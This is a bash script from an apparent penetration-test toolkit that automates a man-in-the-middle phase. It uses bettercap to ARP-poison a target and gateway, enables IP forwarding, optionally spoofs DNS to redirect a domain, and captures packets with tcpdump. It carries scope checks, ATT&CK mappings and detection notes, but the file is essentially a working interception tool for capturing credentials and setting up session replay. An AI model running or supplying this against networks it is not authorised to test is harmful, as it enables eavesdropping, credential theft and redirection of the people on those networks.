#!/usr/bin/env bash
# Phase 9 — Man-in-the-Middle (session label: mitm)
# Positions the attack host on the L2 segment between target devices and the gateway
# via ARP poisoning, then optionally applies DNS spoofing.
# Required as a precondition for the session-replay CVEs (05_cve_exploit l530 / meross).
#
# Usage (from the engagement root):
#   ./09_mitm/mitm.sh arp   <target_ip> [gateway_ip]   # ARP poison target <-> gateway
#   ./09_mitm/mitm.sh dns   <target_ip> <spoof_domain> <spoof_ip>   # DNS spoof on top of ARP
#   ./09_mitm/mitm.sh sniff <target_ip> [duration_s]   # passive sniff (no poisoning)
#   ./09_mitm/mitm.sh stop                             # kill bettercap and restore ARP
#
# ATT&CK: T1557.002 (ARP Cache Poisoning), T1557 (Adversary-in-the-Middle), T1040 (Network Sniffing)
# Kill-chain phase: Delivery (positioning for replay / credential capture)
# Session label: mitm
#
# SAFETY: ARP poison affects the target device only. The gateway (10.100.101.1)
#         must never be a poisoning target per scope rules. bettercap automatically
#         sends ARP restore packets on exit.
. "$(dirname "$0")/../lib.sh"

LABEL=mitm

need() {
  for t in "$@"; do
    command -v "$t" >/dev/null 2>&1 || { echo "[!] $t missing — see 01_setup/attack-host-setup.md"; exit 3; }
  done
}

GW="${MITM_GW:-10.100.101.1}"    # default gateway; override with MITM_GW env var

# ---------------------------------------------------------------------------
# arp: ARP-poison target <-> gateway, enabling intercept of all target traffic.
# Uses bettercap in background; writes bettercap log to run dir.
# Tool: bettercap   ATT&CK: T1557.002, T1040
# Detection: gratuitous ARPs with unexpected MAC; duplicate ARP entries in arp -a.
# ---------------------------------------------------------------------------
do_arp() {
  local target="${1:?usage: mitm.sh arp <target_ip> [gateway_ip]}" gw="${2:-$GW}"
  require_scope "$target"; need bettercap

  # Validate gateway is not being targeted (belt-and-suspenders on top of require_scope)
  if [[ "$target" == "$gw" ]]; then
    echo "[SCOPE] refusing to ARP-poison the gateway itself"; exit 2
  fi

  local dir; dir=$(new_run "$LABEL" "$target")
  echo "[*] ARP poisoning ${target} <-> ${gw}"
  echo "[*] IP forwarding will be enabled to maintain target connectivity"

  # Enable IP forwarding so the target stays online through our host
  echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward >/dev/null

  # bettercap caplet: ARP spoof target only (not the full subnet)
  local caplet="${dir}/arp_spoof.cap"
  cat > "$caplet" << CAPEOF
# bettercap caplet — ARP spoof target only
set arp.spoof.targets ${target}
set arp.spoof.internal false
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
CAPEOF

  local cmd="bettercap -iface fordaysec -caplet ${caplet} -log ${dir}/bettercap.log"
  save_cmd "$dir" "bettercap arp ${target}"
  echo "+ $cmd"
  sudo bettercap -iface fordaysec -caplet "$caplet" -log "${dir}/bettercap.log" 2>&1 \
    | tee "${dir}/stdout.txt" &
  echo "[*] bettercap PID: $!   (run './09_mitm/mitm.sh stop' when done)"
  echo "[*] ARP table on target should now show attack-host MAC for ${gw}"

  end_run "$LABEL" "$target"; echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
# dns: DNS spoofing on top of an active ARP session.
# Redirects DNS lookups for spoof_domain to spoof_ip (e.g. attack host).
# Tool: bettercap dns.spoof   ATT&CK: T1557
# Detection: DNS response with unexpected IP for a known domain.
# ---------------------------------------------------------------------------
do_dns() {
  local target="${1:?usage: mitm.sh dns <target_ip> <spoof_domain> <spoof_ip>}"
  local domain="${2:?spoof domain required}" spoof_ip="${3:?spoof ip required}"
  require_scope "$target"; need bettercap

  local dir; dir=$(new_run "$LABEL" "$target")
  echo "[*] DNS spoofing ${domain} -> ${spoof_ip} for ${target}"
  echo "[!] Requires ARP session to be active (run 'arp' first or include arp.spoof in caplet)"

  local caplet="${dir}/dns_spoof.cap"
  cat > "$caplet" << CAPEOF
# bettercap caplet — ARP + DNS spoof
set arp.spoof.targets ${target}
set arp.spoof.fullduplex true
arp.spoof on
set dns.spoof.domains ${domain}
set dns.spoof.address ${spoof_ip}
dns.spoof on
net.sniff on
CAPEOF

  local cmd="bettercap dns.spoof ${domain}->${spoof_ip} on ${target}"
  save_cmd "$dir" "$cmd"
  echo "+ bettercap -iface fordaysec -caplet ${caplet} -log ${dir}/bettercap.log"
  sudo bettercap -iface fordaysec -caplet "$caplet" -log "${dir}/bettercap.log" 2>&1 \
    | tee "${dir}/stdout.txt" &
  echo "[*] bettercap PID: $!   (run './09_mitm/mitm.sh stop' when done)"

  end_run "$LABEL" "$target"; echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
# sniff: passive packet capture on the tunnel interface (no poisoning).
# Captures all target traffic visible from the attack host's position.
# Tool: tcpdump / bettercap net.sniff   ATT&CK: T1040
# Detection: promiscuous mode on interface.
# ---------------------------------------------------------------------------
do_sniff() {
  local target="${1:?usage: mitm.sh sniff <target_ip> [duration_s]}" dur="${2:-60}"
  require_scope "$target"; need tcpdump

  local dir; dir=$(new_run "$LABEL" "$target")
  local pcap="${dir}/sniff.pcap"
  echo "[*] Passive sniff: host ${target} for ${dur}s -> ${pcap}"
  local cmd="tcpdump -i fordaysec -w ${pcap} host ${target}"
  save_cmd "$dir" "$cmd"
  echo "+ $cmd  (timeout ${dur}s)"
  timeout "$dur" sudo tcpdump -i fordaysec -w "$pcap" host "$target" 2>&1 \
    | tee "${dir}/stdout.txt" || true

  # Print a brief summary
  tcpdump -nn -r "$pcap" 2>/dev/null | tail -5 | tee -a "${dir}/stdout.txt" || true

  end_run "$LABEL" "$target"; echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
# stop: kill all bettercap instances and restore the ARP tables.
# ---------------------------------------------------------------------------
do_stop() {
  echo "[*] Stopping bettercap and restoring ARP"
  sudo pkill -x bettercap 2>/dev/null && echo "[ok] bettercap stopped" || echo "[i] bettercap was not running"
  echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward >/dev/null
  echo "[*] IP forwarding disabled. ARP tables restored by bettercap on exit."
}

# ---------------------------------------------------------------------------
cmd="${1:-}"; shift || true
case "$cmd" in
  arp)   do_arp   "$@" ;;
  dns)   do_dns   "$@" ;;
  sniff) do_sniff "$@" ;;
  stop)  do_stop ;;
  *) sed -n '2,19p' "$0"; exit 1 ;;
esac
